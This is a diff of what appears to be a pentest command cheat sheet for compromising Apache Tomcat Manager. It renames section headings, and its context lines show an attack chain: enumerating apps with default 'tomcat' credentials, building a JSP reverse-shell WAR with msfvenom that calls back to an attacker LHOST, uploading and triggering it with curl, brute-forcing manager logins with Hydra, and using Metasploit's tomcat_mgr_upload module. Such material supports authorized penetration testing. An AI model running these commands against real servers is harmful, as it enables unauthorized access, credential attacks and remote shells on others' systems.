@@ -6,7 +6,7 @@
 
 ---
 
-## List Deployed Applications
+## enum manager deployed apps
 Use the manager text interface to list deployed contexts and their state.
 
 ```bash
@@ -17,7 +17,7 @@ curl -u '{{USERNAME:str:tomcat}}:{{PASSWORD:str:tomcat}}' {{URL:url:http://targe
 
 ---
 
-## Generate Reverse Shell WAR (msfvenom)
+## generate reverse shell war msfvenom
 Create a JSP reverse-shell WAR ready for upload.
 
 ```bash
@@ -28,7 +28,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST:ip}} LPORT={{LPORT:port:444
 
 ---
 
-## Deploy WAR via Manager (curl PUT)
+## upload war manager deploy
 Upload and deploy a WAR file using the Tomcat Manager text API.
 
 ```bash
@@ -39,7 +39,7 @@ curl -X PUT -u '{{USERNAME:str}}:{{PASSWORD:str}}' '{{URL:url:http://target:8080
 
 ---
 
-## Trigger Deployed WAR
+## trigger deployed war shell
 Hit the deployed context to fire the embedded payload.
 
 ```bash
@@ -50,7 +50,7 @@ curl -u '{{USERNAME:str}}:{{PASSWORD:str}}' '{{URL:url:http://target:8080}}/{{CO
 
 ---
 
-## Undeploy Application via Manager
+## undeploy war manager cleanup
 Remove a deployed context from the Tomcat manager.
 
 ```bash
@@ -61,7 +61,7 @@ curl -u '{{USERNAME:str}}:{{PASSWORD:str}}' '{{URL:url:http://target:8080}}/mana
 
 ---
 
-## Brute Force Tomcat Manager (Hydra)
+## brute manager creds hydra
 Spray credentials against the manager's HTTP basic auth.
 
 ```bash
@@ -72,7 +72,7 @@ hydra -L {{USERLIST:wordlist}} -P {{PASSLIST:wordlist}} {{TARGET:ip}} -s {{PORT:
 
 ---
 
-## Metasploit Tomcat Manager Upload
+## exploit manager upload metasploit
 Use Metasploit's tomcat_mgr_upload module for full exploitation.
 
 ```bash
